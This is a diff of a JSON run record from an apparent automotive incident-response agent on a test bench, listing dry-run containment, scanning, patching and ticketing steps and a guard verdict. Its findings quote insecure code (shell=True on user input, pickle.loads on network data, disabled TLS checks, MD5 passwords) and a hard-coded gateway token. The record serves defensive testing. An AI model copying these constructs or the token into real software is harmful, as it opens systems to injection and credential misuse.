+          "finished_at": null,
+          "output": null,
+          "error": null,
+          "refusal_reason": null
+        },
+        {
+          "rule_id": "TOP-003",
+          "kind": "notify",
+          "tool": "notify.create_incident",
+          "params": {
+            "severity": "medium",
+            "summary": "TOP-003: topology rule violated",
+            "rule_id": "TOP-003"
           },
+          "description": "open a topology-violation ticket",
+          "side_effect": "read",
+          "severity_min": "low",
+          "timeout_s": 30,
+          "retries": 1,
+          "pre": [],
+          "post": [],
+          "rollback_steps": [],
+          "requires_authorization": false,
+          "step_id": "704664e0-ef03-4d81-b110-417c0585b059",
+          "status": "pending",
+          "attempts": 0,
+          "started_at": null,
+          "finished_at": null,
+          "output": null,
+          "error": null,
+          "refusal_reason": null
+        },
+        {
+          "rule_id": "TOP-008",
+          "kind": "notify",
+          "tool": "notify.create_incident",
+          "params": {
+            "severity": "medium",
+            "summary": "TOP-008: External A2A agents should not have respond edges to in-vehicle agents to preven",
+            "rule_id": "TOP-008"
+          },
+          "description": "raise an architecture-review ticket",
+          "side_effect": "read",
+          "severity_min": "low",
+          "timeout_s": 30,
+          "retries": 1,
+          "pre": [],
+          "post": [],
+          "rollback_steps": [],
+          "requires_authorization": false,
+          "step_id": "71deea67-acf6-4b02-b9d6-0df3db258926",
+          "status": "pending",
+          "attempts": 0,
+          "started_at": null,
+          "finished_at": null,
+          "output": null,
           "error": null,
           "refusal_reason": null
         },
@@ -952,7 +724,7 @@
           "kind": "audit",
           "tool": "code.scrub_git_history",
           "params": {
-            "repo_path": "C:\\Users\\Oussama_Jeddou\\OneDrive\\Bureau\\Master\\Praktikum\\CyberLLM",
+            "repo_path": "C:\\Users\\Oussama_Jeddou\\OneDrive\\Bureau\\Master\\CyberLLM\\CyberLLM",
             "pattern": "bmw_gw_8a3f5c1e9d4b7a6f2c8d0e4f7a9b1c3d"
           },
           "description": "generate a runbook to scrub the secret from git history",
@@ -964,21 +736,12 @@
           "post": [],
           "rollback_steps": [],
           "requires_authorization": true,
-          "step_id": "e169bceb-e297-452a-814c-047b954a61ff",
-          "status": "completed",
-          "attempts": 1,
-          "started_at": "2026-06-03T15:19:23.155710",
-          "finished_at": "2026-06-03T15:19:23.155710",
-          "output": {
-            "dry_run": true,
-            "would_invoke": "git",
-            "params": {
-              "repo_path": "C:\\Users\\Oussama_Jeddou\\OneDrive\\Bureau\\Master\\Praktikum\\CyberLLM",
-              "pattern": "bmw_gw_8a3f5c1e9d4b7a6f2c8d0e4f7a9b1c3d"
-            },
-            "_status": "would-execute",
-            "_real": false
-          },
+          "step_id": "952dfe9a-2feb-440d-a96b-9cfb7103ce03",
+          "status": "pending",
+          "attempts": 0,
+          "started_at": null,
+          "finished_at": null,
+          "output": null,
           "error": null,
           "refusal_reason": null
         },
@@ -987,7 +750,7 @@
           "kind": "audit",
           "tool": "runtime.snapshot",
           "params": {
-            "source_path": "C:\\Users\\Oussama_Jeddou\\OneDrive\\Bureau\\Master\\Praktikum\\CyberLLM\\mcp_workspace",
+            "source_path": "C:\\Users\\Oussama_Jeddou\\OneDrive\\Bureau\\Master\\CyberLLM\\CyberLLM\\mcp_workspace",
             "label": "can_injection"
           },
           "description": "snapshot the workspace for forensic analysis",
@@ -999,21 +762,12 @@
           "post": [],
           "rollback_steps": [],
           "requires_authorization": false,
-          "step_id": "1b316c62-c3bf-4e42-9ea7-4d6e091b281a",
-          "status": "completed",
-          "attempts": 1,
-          "started_at": "2026-06-03T15:19:23.155710",
-          "finished_at": "2026-06-03T15:19:23.155710",
-          "output": {
-            "dry_run": true,
-            "would_invoke": "tar",
-            "params": {
-              "source_path": "C:\\Users\\Oussama_Jeddou\\OneDrive\\Bureau\\Master\\Praktikum\\CyberLLM\\mcp_workspace",
-              "label": "can_injection"
-            },
-            "_status": "would-execute",
-            "_real": false
-          },
+          "step_id": "38b9ce0b-cf6a-4e73-b6a1-ffbcd97637d1",
+          "status": "pending",
+          "attempts": 0,
+          "started_at": null,
+          "finished_at": null,
+          "output": null,
           "error": null,
           "refusal_reason": null
         }
@@ -1021,7 +775,7 @@
     },
     "audit_log": [
       {
-        "step_id": "44c22093-8bbc-4af7-98f2-1320e23dae29",
+        "step_id": "98dca722-e25c-4e4b-8ef5-e13b6dffc925",
         "tool": "runtime.safe_mode",
         "kind": "contain",
         "status": "completed",
@@ -1029,7 +783,7 @@
         "attempts": 1
       },
       {
-        "step_id": "a642273f-9e58-4936-9109-5a4ad66c7d8f",
+        "step_id": "5682e7dc-cfbb-48b4-b979-81cb9d8e4220",
         "tool": "network.isolate_node",
         "kind": "contain",
         "status": "completed",
@@ -1037,207 +791,23 @@
         "attempts": 1
       },
       {
-        "step_id": "f8666ad3-a5b8-4ac7-95fd-398a2c792fc2",
-        "tool": "firewall.rate_limit",
+        "step_id": "80910fa6-e089-4d09-89aa-0027f503610b",
+        "tool": "notify.create_incident",
         "kind": "contain",
-        "status": "completed",
-        "msg": "completed",
-        "attempts": 1
-      },
-      {
-        "step_id": "1751721f-6a7d-4004-9c25-a8375570e115",
-        "tool": "firewall.block_ipv4",
-        "kind": "contain",
-        "status": "completed",
-        "msg": "completed",
-        "attempts": 1
-      },
-      {
-        "step_id": "e4b8450a-a40c-488b-a0bf-e2f488ecc4b7",
-        "tool": "code.static_scan",
-        "kind": "observe",
-        "status": "completed",
-        "msg": "completed",
-        "attempts": 1
-      },
-      {
-        "step_id": "f0949fc4-8ccb-486b-b0d5-58acd5d9922b",
-        "tool": "code.static_scan",
-        "kind": "observe",
-        "status": "completed",
-        "msg": "completed",
-        "attempts": 1
-      },
-      {
-        "step_id": "b4b51b12-b636-4499-807e-f7b84933ad3b",
-        "tool": "observe.log_tail",
-        "kind": "observe",
-        "status": "completed",
-        "msg": "completed",
-        "attempts": 1
-      },
-      {
-        "step_id": "7bcea5cd-fafe-44d8-8693-aae8ca9e5cbf",
-        "tool": "secrets.rotate",
-        "kind": "eradicate",
-        "status": "completed",
-        "msg": "completed",
-        "attempts": 1
-      },
-      {
-        "step_id": "03fa3d10-197c-49bc-9841-21513c473b1d",
-        "tool": "code.propose_patch",
-        "kind": "eradicate",
-        "status": "completed",
-        "msg": "completed",
-        "attempts": 1
-      },
-      {
-        "step_id": "287314fa-7a3a-4519-a9d1-135b1c733ef1",
-        "tool": "code.propose_patch",
-        "kind": "eradicate",
-        "status": "completed",
-        "msg": "completed",
-        "attempts": 1
-      },
-      {
-        "step_id": "07302c84-ee66-4bfb-86b9-6872dab9675b",
-        "tool": "code.propose_patch",
-        "kind": "eradicate",
-        "status": "completed",
-        "msg": "completed",
-        "attempts": 1
-      },
-      {
-        "step_id": "c29e6ee1-e296-48f9-bd08-8dfbb03739d5",
-        "tool": "code.propose_patch",
-        "kind": "eradicate",
-        "status": "completed",
-        "msg": "completed",
-        "attempts": 1
-      },
-      {
-        "step_id": "5d8241f7-17b6-48a6-b19e-beba952a77b9",
-        "tool": "code.propose_patch",
-        "kind": "eradicate",
-        "status": "completed",
-        "msg": "completed",
-        "attempts": 1
-      },
-      {
-        "step_id": "aecdfd0f-ff88-46cd-8cd0-0daa2b02da18",
-        "tool": "notify.create_incident",
-        "kind": "notify",
-        "status": "completed",
-        "msg": "completed",
-        "attempts": 1
-      },
-      {
-        "step_id": "bd8f5e8f-72be-490d-8559-b0b7f17e26d3",
-        "tool": "notify.create_incident",
-        "kind": "notify",
-        "status": "completed",
-        "msg": "completed",
-        "attempts": 1
-      },
-      {
-        "step_id": "f9479107-a215-4e05-8414-689c528c0be4",
-        "tool": "notify.driver",
-        "kind": "notify",
-        "status": "completed",
-        "msg": "completed",
-        "attempts": 1
-      },
-      {
-        "step_id": "a7b3974e-d6cf-4c48-9d4e-7516ebde0d78",
-        "tool": "notify.create_incident",
-        "kind": "notify",
-        "status": "completed",
-        "msg": "completed",
-        "attempts": 1
-      },
-      {
-        "step_id": "9734ff06-67f1-4e30-abee-d332da69c30e",
-        "tool": "notify.create_incident",
-        "kind": "notify",
-        "status": "completed",
-        "msg": "completed",
-        "attempts": 1
-      },
-      {
-        "step_id": "77ec7a03-4410-4d86-a8d1-03c8639a4863",
-        "tool": "notify.create_incident",
-        "kind": "notify",
-        "status": "completed",
-        "msg": "completed",
-        "attempts": 1
-      },
-      {
-        "step_id": "1d4b9c29-ffef-4614-bba8-74c781f05878",
-        "tool": "notify.create_incident",
-        "kind": "notify",
-        "status": "completed",
-        "msg": "completed",
-        "attempts": 1
-      },
-      {
-        "step_id": "92dcfc03-010a-4dff-8c3f-4ed87b9a175d",
-        "tool": "notify.create_incident",
-        "kind": "notify",
-        "status": "completed",
-        "msg": "completed",
-        "attempts": 1
-      },
-      {
-        "step_id": "0fc4c759-7732-4d29-8bc2-2c3f32a36e05",
-        "tool": "notify.create_incident",
-        "kind": "notify",
-        "status": "completed",
-        "msg": "completed",
-        "attempts": 1
-      },
-      {
-        "step_id": "44b9b14a-a843-4d32-828f-5b06c33b0be1",
-        "tool": "notify.create_incident",
-        "kind": "notify",
-        "status": "completed",
-        "msg": "completed",
-        "attempts": 1
-      },
-      {
-        "step_id": "6f065d5e-44ce-41f9-8069-131d6be72b81",
-        "tool": "notify.create_incident",
-        "kind": "notify",
-        "status": "completed",
-        "msg": "completed",
-        "attempts": 1
-      },
-      {
-        "step_id": "e169bceb-e297-452a-814c-047b954a61ff",
-        "tool": "code.scrub_git_history",
-        "kind": "audit",
-        "status": "completed",
-        "msg": "completed",
-        "attempts": 1
-      },
-      {
-        "step_id": "1b316c62-c3bf-4e42-9ea7-4d6e091b281a",
-        "tool": "runtime.snapshot",
-        "kind": "audit",
-        "status": "completed",
-        "msg": "completed",
-        "attempts": 1
+        "status": "refused",
+        "msg": "refused by guard: H_a judge refused: The action 'alert_only' does not directly contribute to producing a findings report. Alerting the security team may inform them of an issue, but it does not produce a report itself. Additional actions would be needed to compile and document the findings into a report format.",
+        "attempts": 0
       }
     ]
   },
   "mcp_audit": [
     {
-      "ts": "2026-06-03T15:19:23.155",
+      "ts": "2026-06-03T19:42:02.124",
       "tool": "runtime.safe_mode",
       "side_effect": "destructive",
       "real_invoked": false,
       "dry_run": true,
-      "elapsed_ms": 0.0,
+      "elapsed_ms": 0.04,
       "status": "would-execute",
       "params": {
         "target": "TESTBENCH-01"
@@ -1252,12 +822,12 @@
       "error": null
     },
     {
-      "ts": "2026-06-03T15:19:23.155",
+      "ts": "2026-06-03T19:42:02.125",
       "tool": "network.isolate_node",
       "side_effect": "destructive",
       "real_invoked": false,
       "dry_run": true,
-      "elapsed_ms": 0.0,
+      "elapsed_ms": 0.02,
       "status": "would-execute",
       "params": {
         "node_id": "BodyCtrl",
@@ -1272,599 +842,21 @@
         }
       },
       "error": null
-    },
-    {
-      "ts": "2026-06-03T15:19:23.155",
-      "tool": "firewall.rate_limit",
-      "side_effect": "write",
-      "real_invoked": false,
-      "dry_run": true,
-      "elapsed_ms": 0.0,
-      "status": "would-execute",
-      "params": {
-        "ipv4": "0.0.0.0",
-        "rate_per_minute": 6,
-        "duration_minutes": 30
-      },
-      "result_payload": {
-        "dry_run": true,
-        "would_invoke": "(no real binary)",
-        "params": {
-          "ipv4": "0.0.0.0",
-          "rate_per_minute": 6,
-          "duration_minutes": 30
-        }
-      },
-      "error": null
-    },
-    {
-      "ts": "2026-06-03T15:19:23.155",
-      "tool": "firewall.block_ipv4",
-      "side_effect": "write",
-      "real_invoked": false,
-      "dry_run": true,
-      "elapsed_ms": 0.0,
-      "status": "would-execute",
-      "params": {
-        "ipv4": "0.0.0.0",
-        "duration_minutes": 60,
-        "reason": "LOG-AUTH-03"
-      },
-      "result_payload": {
-        "dry_run": true,
-        "would_invoke": "netsh",
-        "params": {
-          "ipv4": "0.0.0.0",
-          "duration_minutes": 60,
-          "reason": "LOG-AUTH-03"
-        }
-      },
-      "error": null
-    },
-    {
-      "ts": "2026-06-03T15:19:23.155",
-      "tool": "code.static_scan",
-      "side_effect": "read",
-      "real_invoked": false,
-      "dry_run": true,
-      "elapsed_ms": 0.0,
-      "status": "would-execute",
-      "params": {
-        "path": "02_can_gateway.py",
-        "analyser": "auto"
-      },
-      "result_payload": {
-        "dry_run": true,
-        "would_invoke": "bandit",
-        "params": {
-          "path": "02_can_gateway.py",
-          "analyser": "auto"
-        }
-      },
-      "error": null
-    },
-    {
-      "ts": "2026-06-03T15:19:23.155",
-      "tool": "code.static_scan",
-      "side_effect": "read",
-      "real_invoked": false,
-      "dry_run": true,
-      "elapsed_ms": 0.0,
-      "status": "would-execute",
-      "params": {
-        "path": "C:\\Users\\Oussama_Jeddou\\OneDrive\\Bureau\\Master\\Praktikum\\CyberLLM\\examples\\small\\02_can_gateway.py",
-        "analyser": "auto"
-      },
-      "result_payload": {
-        "dry_run": true,
-        "would_invoke": "bandit",
-        "params": {
-          "path": "C:\\Users\\Oussama_Jeddou\\OneDrive\\Bureau\\Master\\Praktikum\\CyberLLM\\examples\\small\\02_can_gateway.py",
-          "analyser": "auto"
-        }
-      },
-      "error": null
-    },
-    {
-      "ts": "2026-06-03T15:19:23.155",
-      "tool": "observe.log_tail",
-      "side_effect": "read",
-      "real_invoked": false,
-      "dry_run": true,
-      "elapsed_ms": 0.0,
-      "status": "would-execute",
-      "params": {
-        "path": "C:\\Users\\Oussama_Jeddou\\OneDrive\\Bureau\\Master\\Praktikum\\CyberLLM\\examples\\logs\\03_can_injection.log",
-        "pattern": "Failed password",
-        "timeout_s": 5
-      },
-      "result_payload": {
-        "dry_run": true,
-        "would_invoke": "(no real binary)",
-        "params": {
-          "path": "C:\\Users\\Oussama_Jeddou\\OneDrive\\Bureau\\Master\\Praktikum\\CyberLLM\\examples\\logs\\03_can_injection.log",
-          "pattern": "Failed password",
-          "timeout_s": 5
-        }
-      },
-      "error": null
-    },
-    {
-      "ts": "2026-06-03T15:19:23.155",
-      "tool": "secrets.rotate",
-      "side_effect": "destructive",
-      "real_invoked": false,
-      "dry_run": true,
-      "elapsed_ms": 0.0,
-      "status": "would-execute",
-      "params": {
-        "secret_id": "***redacted***"
-      },
-      "result_payload": {
-        "dry_run": true,
-        "would_invoke": "vault",
-        "params": {
-          "secret_id": "***redacted***"
-        }
-      },
-      "error": null
-    },
-    {
-      "ts": "2026-06-03T15:19:23.155",
-      "tool": "code.propose_patch",
-      "side_effect": "write",
-      "real_invoked": false,
-      "dry_run": true,
-      "elapsed_ms": 0.0,
-      "status": "would-execute",
-      "params": {
-        "rule_id": "CODE-003",
-        "file": "02_can_gateway.py",
-        "diff": "--- a/02_can_gateway.py\n+++ b/02_can_gateway.py\n@@ secret-load-site @@\n- API_KEY = '<hard-coded-secret>'\n+ import os\n+ API_KEY = os.environ['API_KEY']        # CODE-003 remediation\n",
-        "rationale": "Move secret to env var or secret manager."
-      },
-      "result_payload": {
-        "dry_run": true,
-        "would_invoke": "(no real binary)",
-        "params": {
-          "rule_id": "CODE-003",
-          "file": "02_can_gateway.py",
-          "diff": "--- a/02_can_gateway.py\n+++ b/02_can_gateway.py\n@@ secret-load-site @@\n- API_KEY = '<hard-coded-secret>'\n+ import os\n+ API_KEY = os.environ['API_KEY']        # CODE-003 remediation\n",
-          "rationale": "Move secret to env var or secret manager."
-        }
-      },
-      "error": null
-    },
-    {
-      "ts": "2026-06-03T15:19:23.155",
-      "tool": "code.propose_patch",
-      "side_effect": "write",
-      "real_invoked": false,
-      "dry_run": true,
-      "elapsed_ms": 0.0,
-      "status": "would-execute",
-      "params": {
-        "rule_id": "CODE-005",
-        "file": "02_can_gateway.py",
-        "diff": "--- a/02_can_gateway.py\n+++ b/02_can_gateway.py\n@@ context-of-finding @@\n# rule_id: CODE-005  (critical)\n# evidence: 02_can_gateway.py: ct:     # CODE-005: pickle.loads on untrusted networ\n# remediation: replace `pickle.loads(b)` with `json.loads(b)` after schema validation.\n",
-        "rationale": "Replace the dangerous construct with the safe equivalent recommended in the rule."
-      },
-      "result_payload": {
-        "dry_run": true,
-        "would_invoke": "(no real binary)",
-        "params": {
-          "rule_id": "CODE-005",
-          "file": "02_can_gateway.py",
-          "diff": "--- a/02_can_gateway.py\n+++ b/02_can_gateway.py\n@@ context-of-finding @@\n# rule_id: CODE-005  (critical)\n# evidence: 02_can_gateway.py: ct:     # CODE-005: pickle.loads on untrusted networ\n# remediation: replace `pickle.loads(b)` with `json.loads(b)` after schema validation.\n",
-          "rationale": "Replace the dangerous construct with the safe equivalent recommended in the rule."
-        }
-      },
-      "error": null
-    },
-    {
-      "ts": "2026-06-03T15:19:23.155",
-      "tool": "code.propose_patch",
-      "side_effect": "write",
-      "real_invoked": false,
-      "dry_run": true,
-      "elapsed_ms": 0.0,
-      "status": "would-execute",
-      "params": {
-        "rule_id": "CODE-006",
-        "file": "02_can_gateway.py",
-        "diff": "--- a/02_can_gateway.py\n+++ b/02_can_gateway.py\n@@ context-of-finding @@\n# rule_id: CODE-006  (high)\n# evidence: 02_can_gateway.py: t_context()     ctx.check_hostname = False     ctx.verify_mode\n# remediation: remove `verify=False`; provide a CA bundle via `verify='/path/to/ca.pem'`.\n",
-        "rationale": "Auto-generated remediation proposal."
-      },
-      "result_payload": {
-        "dry_run": true,
-        "would_invoke": "(no real binary)",
-        "params": {
-          "rule_id": "CODE-006",
-          "file": "02_can_gateway.py",
-          "diff": "--- a/02_can_gateway.py\n+++ b/02_can_gateway.py\n@@ context-of-finding @@\n# rule_id: CODE-006  (high)\n# evidence: 02_can_gateway.py: t_context()     ctx.check_hostname = False     ctx.verify_mode\n# remediation: remove `verify=False`; provide a CA bundle via `verify='/path/to/ca.pem'`.\n",
-          "rationale": "Auto-generated remediation proposal."
-        }
-      },
-      "error": null
-    },
-    {
-      "ts": "2026-06-03T15:19:23.155",
-      "tool": "code.propose_patch",
-      "side_effect": "write",
-      "real_invoked": false,
-      "dry_run": true,
-      "elapsed_ms": 0.0,
-      "status": "would-execute",
-      "params": {
-        "rule_id": "CODE-001",
-        "file": "C:\\Users\\Oussama_Jeddou\\OneDrive\\Bureau\\Master\\Praktikum\\CyberLLM\\examples\\small\\02_can_gateway.py",
-        "diff": "--- a/unknown.py\n+++ b/unknown.py\n@@ context-of-finding @@\n# rule_id: CODE-001  (high)\n# evidence: subprocess.call(user_input, shell=True)\n# remediation: replace `subprocess.call(x, shell=True)` with\n    `subprocess.run(shlex.split(x), check=True)`\n    and validate `x` against an allow-list.\n",
-        "rationale": "Replace the dangerous construct with the safe equivalent recommended in the rule."
-      },
-      "result_payload": {
-        "dry_run": true,
-        "would_invoke": "(no real binary)",
-        "params": {
-          "rule_id": "CODE-001",
-          "file": "C:\\Users\\Oussama_Jeddou\\OneDrive\\Bureau\\Master\\Praktikum\\CyberLLM\\examples\\small\\02_can_gateway.py",
-          "diff": "--- a/unknown.py\n+++ b/unknown.py\n@@ context-of-finding @@\n# rule_id: CODE-001  (high)\n# evidence: subprocess.call(user_input, shell=True)\n# remediation: replace `subprocess.call(x, shell=True)` with\n    `subprocess.run(shlex.split(x), check=True)`\n    and validate `x` against an allow-list.\n",
-          "rationale": "Replace the dangerous construct with the safe equivalent recommended in the rule."
-        }
-      },
-      "error": null
-    },
-    {
-      "ts": "2026-06-03T15:19:23.155",
-      "tool": "code.propose_patch",
-      "side_effect": "write",
-      "real_invoked": false,
-      "dry_run": true,
-      "elapsed_ms": 0.0,
-      "status": "would-execute",
-      "params": {
-        "rule_id": "CODE-002",
-        "file": "C:\\Users\\Oussama_Jeddou\\OneDrive\\Bureau\\Master\\Praktikum\\CyberLLM\\examples\\small\\02_can_gateway.py",
-        "diff": "--- a/unknown.py\n+++ b/unknown.py\n@@ context-of-finding @@\n# rule_id: CODE-002  (medium)\n# evidence: hashlib.md5(password)\n# remediation: replace `hashlib.md5(p)` with `argon2.PasswordHasher().hash(p)`.\n",
-        "rationale": "Auto-generated remediation proposal."
-      },
-      "result_payload": {
-        "dry_run": true,
-        "would_invoke": "(no real binary)",
-        "params": {
-          "rule_id": "CODE-002",
-          "file": "C:\\Users\\Oussama_Jeddou\\OneDrive\\Bureau\\Master\\Praktikum\\CyberLLM\\examples\\small\\02_can_gateway.py",
-          "diff": "--- a/unknown.py\n+++ b/unknown.py\n@@ context-of-finding @@\n# rule_id: CODE-002  (medium)\n# evidence: hashlib.md5(password)\n# remediation: replace `hashlib.md5(p)` with `argon2.PasswordHasher().hash(p)`.\n",
-          "rationale": "Auto-generated remediation proposal."
-        }
-      },
-      "error": null
-    },
-    {
-      "ts": "2026-06-03T15:19:23.155",
-      "tool": "notify.create_incident",
-      "side_effect": "write",
-      "real_invoked": false,
-      "dry_run": true,
-      "elapsed_ms": 0.0,
-      "status": "would-execute",
-      "params": {
-        "severity": "critical",
-        "summary": "Hard-coded secret in source",
-        "rule_id": "CODE-003",
-        "evidence": "02_can_gateway.py: n-can   GATEWAY_API_TOKEN = \"bmw_gw_8a3f5c1e9d4b7a6f2c8d0e4f7a9b1c3d\"   # CODE-003   @dat"
-      },
-      "result_payload": {
-        "dry_run": true,
-        "would_invoke": "(no real binary)",
-        "params": {
-          "severity": "critical",
-          "summary": "Hard-coded secret in source",
-          "rule_id": "CODE-003",
-          "evidence": "02_can_gateway.py: n-can   GATEWAY_API_TOKEN = \"bmw_gw_8a3f5c1e9d4b7a6f2c8d0e4f7a9b1c3d\"   # CODE-003   @dat"
-        }
-      },
-      "error": null
-    },
-    {
-      "ts": "2026-06-03T15:19:23.155",
-      "tool": "notify.create_incident",
-      "side_effect": "write",
-      "real_invoked": false,
-      "dry_run": true,
-      "elapsed_ms": 0.0,
-      "status": "would-execute",
-      "params": {
-        "severity": "critical",
-        "summary": "CODE-005: Unsafe deserialization (pickle / yaml.load / eval)",
-        "rule_id": "CODE-005",
-        "evidence": "02_can_gateway.py: ct:     # CODE-005: pickle.loads on untrusted networ"
-      },
-      "result_payload": {
-        "dry_run": true,
-        "would_invoke": "(no real binary)",
-        "params": {
-          "severity": "critical",
-          "summary": "CODE-005: Unsafe deserialization (pickle / yaml.load / eval)",
-          "rule_id": "CODE-005",
-          "evidence": "02_can_gateway.py: ct:     # CODE-005: pickle.loads on untrusted networ"
-        }
-      },
-      "error": null
-    },
-    {
-      "ts": "2026-06-03T15:19:23.155",
-      "tool": "notify.driver",
-      "side_effect": "write",
-      "real_invoked": false,
-      "dry_run": true,
-      "elapsed_ms": 0.0,
-      "status": "would-execute",
-      "params": {
-        "vehicle": "TESTBENCH-01",
-        "message": "Safety-critical bus anomaly detected. Vehicle is in limited mode \u2014 please pull over safely.",
-        "urgency": "critical"
-      },
-      "result_payload": {
-        "dry_run": true,
-        "would_invoke": "(no real binary)",
-        "params": {
-          "vehicle": "TESTBENCH-01",
-          "message": "Safety-critical bus anomaly detected. Vehicle is in limited mode \u2014 please pull over safely.",
-          "urgency": "critical"
-        }
-      },
-      "error": null
-    },
-    {
-      "ts": "2026-06-03T15:19:23.155",
-      "tool": "notify.create_incident",
-      "side_effect": "write",
-      "real_invoked": false,
-      "dry_run": true,
-      "elapsed_ms": 0.0,
-      "status": "would-execute",
-      "params": {
-        "severity": "high",
-        "summary": "CODE-006: TLS certificate verification disabled",
-        "rule_id": "CODE-006"
-      },
-      "result_payload": {
-        "dry_run": true,
-        "would_invoke": "(no real binary)",
-        "params": {
-          "severity": "high",
-          "summary": "CODE-006: TLS certificate verification disabled",
-          "rule_id": "CODE-006"
-        }
-      },
-      "error": null
-    },
-    {
-      "ts": "2026-06-03T15:19:23.155",
-      "tool": "notify.create_incident",
-      "side_effect": "write",
-      "real_invoked": false,
-      "dry_run": true,
-      "elapsed_ms": 0.0,
-      "status": "would-execute",
-      "params": {
-        "severity": "high",
-        "summary": "CODE-001: Shell-injection sink fed by untrusted input.",
-        "rule_id": "CODE-001",
-        "evidence": "subprocess.call(user_input, shell=True)"
-      },
-      "result_payload": {
-        "dry_run": true,
-        "would_invoke": "(no real binary)",
-        "params": {
-          "severity": "high",
-          "summary": "CODE-001: Shell-injection sink fed by untrusted input.",
-          "rule_id": "CODE-001",
-          "evidence": "subprocess.call(user_input, shell=True)"
-        }
-      },
-      "error": null
-    },
-    {
-      "ts": "2026-06-03T15:19:23.155",
-      "tool": "notify.create_incident",
-      "side_effect": "write",
-      "real_invoked": false,
-      "dry_run": true,
-      "elapsed_ms": 0.0,
-      "status": "would-execute",
-      "params": {
-        "severity": "high",
-        "summary": "LOG-NET-01: log anomaly",
-        "rule_id": "LOG-NET-01",
-        "evidence": "10.0.0.42 \u2192 10.0.0.255 :7000 burst 1200 pkts/s"
-      },
-      "result_payload": {
-        "dry_run": true,
-        "would_invoke": "(no real binary)",
-        "params": {
-          "severity": "high",
-          "summary": "LOG-NET-01: log anomaly",
-          "rule_id": "LOG-NET-01",
-          "evidence": "10.0.0.42 \u2192 10.0.0.255 :7000 burst 1200 pkts/s"
-        }
-      },
-      "error": null
-    },
-    {
-      "ts": "2026-06-03T15:19:23.155",
-      "tool": "notify.create_incident",
-      "side_effect": "write",
-      "real_invoked": false,
-      "dry_run": true,
-      "elapsed_ms": 0.0,
-      "status": "would-execute",
-      "params": {
-        "severity": "high",
-        "summary": "TOP-001: HPC\u2194ZoneECU must be Ethernet/IEEE-1722",
-        "rule_id": "TOP-001"
-      },
-      "result_payload": {
-        "dry_run": true,
-        "would_invoke": "(no real binary)",
-        "params": {
-          "severity": "high",
-          "summary": "TOP-001: HPC\u2194ZoneECU must be Ethernet/IEEE-1722",
-          "rule_id": "TOP-001"
-        }
-      },
-      "error": null
-    },
-    {
-      "ts": "2026-06-03T15:19:23.155",
-      "tool": "notify.create_incident",
-      "side_effect": "write",
-      "real_invoked": false,
-      "dry_run": true,
-      "elapsed_ms": 0.0,
-      "status": "would-execute",
-      "params": {
-        "severity": "high",
-        "summary": "TOP-002: External actors must not write to long-term memory",
-        "rule_id": "TOP-002"
-      },
-      "result_payload": {
-        "dry_run": true,
-        "would_invoke": "(no real binary)",
-        "params": {
-          "severity": "high",
-          "summary": "TOP-002: External actors must not write to long-term memory",
-          "rule_id": "TOP-002"
-        }
-      },
-      "error": null
-    },
-    {
-      "ts": "2026-06-03T15:19:23.155",
-      "tool": "notify.create_incident",
-      "side_effect": "write",
-      "real_invoked": false,
-      "dry_run": true,
-      "elapsed_ms": 0.0,
-      "status": "would-execute",
-      "params": {
-        "severity": "high",
-        "summary": "TOP-007: Brake ECU receives commands from non-brake source",
-        "rule_id": "TOP-007"
-      },
-      "result_payload": {
-        "dry_run": true,
-        "would_invoke": "(no real binary)",
-        "params": {
-          "severity": "high",
-          "summary": "TOP-007: Brake ECU receives commands from non-brake source",
-          "rule_id": "TOP-007"
-        }
-      },
-      "error": null
-    },
-    {
-      "ts": "2026-06-03T15:19:23.155",
-      "tool": "notify.create_incident",
-      "side_effect": "write",
-      "real_invoked": false,
-      "dry_run": true,
-      "elapsed_ms": 0.0,
-      "status": "would-execute",
-      "params": {
-        "severity": "medium",
-        "summary": "CODE-002: Weak hash algorithm for password storage.",
-        "rule_id": "CODE-002"
-      },
-      "result_payload": {
-        "dry_run": true,
-        "would_invoke": "(no real binary)",
-        "params": {
-          "severity": "medium",
-          "summary": "CODE-002: Weak hash algorithm for password storage.",
-          "rule_id": "CODE-002"
-        }
-      },
-      "error": null
-    },
-    {
-      "ts": "2026-06-03T15:19:23.155",
-      "tool": "notify.create_incident",
-      "side_effect": "write",
-      "real_invoked": false,
-      "dry_run": true,
-      "elapsed_ms": 0.0,
-      "status": "would-execute",
-      "params": {
-        "severity": "high",
-        "summary": "Brute-force pattern detected",
-        "rule_id": "LOG-AUTH-03",
-        "evidence": "12 failed auth attempts in 30 s, user='root'"
-      },
-      "result_payload": {
-        "dry_run": true,
-        "would_invoke": "(no real binary)",
-        "params": {
-          "severity": "high",
-          "summary": "Brute-force pattern detected",
-          "rule_id": "LOG-AUTH-03",
-          "evidence": "12 failed auth attempts in 30 s, user='root'"
-        }
-      },
-      "error": null
-    },
-    {
-      "ts": "2026-06-03T15:19:23.155",
-      "tool": "code.scrub_git_history",
-      "side_effect": "destructive",
-      "real_invoked": false,
-      "dry_run": true,
-      "elapsed_ms": 0.0,
-      "status": "would-execute",
-      "params": {
-        "repo_path": "C:\\Users\\Oussama_Jeddou\\OneDrive\\Bureau\\Master\\Praktikum\\CyberLLM",
-        "pattern": "bmw_gw_8a3f5c1e9d4b7a6f2c8d0e4f7a9b1c3d"
-      },
-      "result_payload": {
-        "dry_run": true,
-        "would_invoke": "git",
-        "params": {
-          "repo_path": "C:\\Users\\Oussama_Jeddou\\OneDrive\\Bureau\\Master\\Praktikum\\CyberLLM",
-          "pattern": "bmw_gw_8a3f5c1e9d4b7a6f2c8d0e4f7a9b1c3d"
-        }
-      },
-      "error": null
-    },
-    {
-      "ts": "2026-06-03T15:19:23.155",
-      "tool": "runtime.snapshot",
-      "side_effect": "write",
-      "real_invoked": false,
-      "dry_run": true,
-      "elapsed_ms": 0.0,
-      "status": "would-execute",
-      "params": {
-        "source_path": "C:\\Users\\Oussama_Jeddou\\OneDrive\\Bureau\\Master\\Praktikum\\CyberLLM\\mcp_workspace",
-        "label": "can_injection"
-      },
-      "result_payload": {
-        "dry_run": true,
-        "would_invoke": "tar",
-        "params": {
-          "source_path": "C:\\Users\\Oussama_Jeddou\\OneDrive\\Bureau\\Master\\Praktikum\\CyberLLM\\mcp_workspace",
-          "label": "can_injection"
-        }
-      },
-      "error": null
     }
   ],
   "guard_verdict": {
-    "allowed": true,
+    "allowed": false,
     "task_alignment": true,
-    "action_alignment": true,
+    "action_alignment": false,
     "source_authorization": true,
     "data_isolation": true,
-    "reason": "all four properties satisfied"
